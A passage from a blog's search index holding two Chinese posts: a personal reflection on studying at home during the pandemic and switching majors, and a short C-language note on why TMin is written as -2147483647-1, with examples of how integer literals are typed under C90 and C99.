    <content type="html"><![CDATA[<p>以为高考之后，故乡就“只有寒暑，没有春秋”，这句话在今年被彻底打破了。在家已经近四个月，应该是上学后在家呆的最久的一次。在疫情下，不知道期末和开学哪个先到来。已经说不清自己到底是希望开学，还是希望这学期在家中结束。</p>  <a id="more"></a><p>这本应该是我最特殊的时期，下定决心转专业之后就已经想好这学期必然有很多的时间供我学习一些在之前没太多时间学的知识，但是在家确实很难像在学校一样，保持长时间的学习。甚至感觉连课内的学习都很难达到自己理想中的地步。看似看了几本书，但是除了已经有一定基础的C编程，好像很多都知识浅尝则止。《C++ Prime》看完了基本内容就停止了，I/O控制都没去碰，看”Computer Systems:A Programmer’s Perspective”就像在挤牙膏，有时候一个星期都不看几页，学python兴趣挺大，但是总感觉找不到学的方向，学完爬虫后就不知道要学什么了。</p><p>以前一直喜欢never limit yourself这句话，但是尝试越多，似乎越来越困惑。甚至连转专业这件事，虽然对家人朋友做出一副胸有成竹，考虑已久的样子，但是其实这个念头似乎是在北京初雪的时候突然冒出来的，自己都不知道是不是“头脑一热”做的决定。毕竟是要去接受一种自己几乎从未接触的考核方式。就像即将到来的数据结构考试，确信如果不是考试我可以全部满分，但是在考试那种情况下，我有些害怕，那种从未尝试的考核方式。希望自己可以通过吧。</p><p>再说说看书吧，今年计划要看50本书，但是在家这么久却只是看完了《月亮与六便士》，《瓦尔登湖》还在一点点的磨蹭。似乎现在很难找到以前那种读书只是读书的感觉，总害怕自己看书什么都得不到，还未开始翻开书本就压力十足，不再是单纯的享受。<br>三十而不惑，希望自己在三十也可以做到不惑。</p>]]></content>
    
    
    <categories>
      
      <category>生活随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>something about Tmin</title>
    <link href="/2020/05/08/something-about-Tmin/"/>
    <url>/2020/05/08/something-about-Tmin/</url>
    
    <content type="html"><![CDATA[<p>在C语言中，表示TMin（32位为例）通常不用-2147483648,而用-2147483647-1</p><p>reason:</p><p>When the compiler encounters a number of the form -X, it first determines the data type and value for X and then negates it.</p><p>对于十进制与十六进制数c的处理为</p><p>ISO90:Decimal int-long-unsigned-unsigned long</p><p>Hexadecimal int-unsigned-long-unsigned long</p><p>ISO99:Decinal int-long-long long</p><p>Hexadecimal int-unsigned-long-unsigned long-long long-unsigned long long<br><a id="more"></a><br>对于数-2147483648的处理：</p><p>ISO90:32位程序 unsigned</p><p>64位程序 long</p><p>ISO99:32位程序 long long</p><p>64位程序 long</p><p>对于-2147483648的十六进制表示0x80000000:</p><p>ISO90:32位程序 unsigned</p><p>64位程序 unsigned</p><p>ISO99:32位程序 unsigned</p><p>64位程序 unsigned</p><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> dpos32 = (<span class="hljs-number">-2147483648</span> &gt; <span class="hljs-number">0</span>);<span class="hljs-built_in">int</span> hpos32 = (<span class="hljs-number">0x80000000</span> &gt; <span class="hljs-number">0</span>);printf(<span class="hljs-string">"%d %d"</span>,dpos32,hpos32);</code></pre><p>对ISO90标准，32位程序输出1 1</p><p>64位程序输出0 1</p><p>对ISO99标准，32位程序输出0 1</p><p>64位程序输出0 1</p><p>但是对于</p><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> dtmin32 = <span class="hljs-number">-2147483648</span>;<span class="hljs-built_in">int</span> dposa = (dtmin32 &gt; <span class="hljs-number">0</span>);<span class="hljs-built_in">int</span> htmin32 = <span class="hljs-number">0x80000000</span>;<span class="hljs-built_in">int</span> hposa = (htmin32 &gt; <span class="hljs-number">0</span>);printf(<span class="hljs-string">"%d %d"</span>,dposa,hposa);</code></pre><p>无论32位或64位，无论ISO90或ISO99 ,输出都是：0 0</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
